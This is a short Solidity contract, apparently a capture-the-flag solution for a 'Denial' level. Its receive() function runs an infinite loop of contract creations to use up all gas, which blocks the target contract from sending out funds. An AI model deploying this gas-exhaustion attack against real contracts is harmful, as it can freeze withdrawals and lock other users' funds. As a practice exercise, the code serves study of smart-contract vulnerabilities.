// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Denial.sol";

contract AttackingDenial {
    address payable public contractAddress;

    constructor(address payable _contractAddress) {
        contractAddress = _contractAddress;
    }

    receive() payable external {
        while(true) {
            // gas intensive just to reduce test time (:
            // create -> 
            assembly {
                pop(create(0,0,0))
            }
        }
    }
}
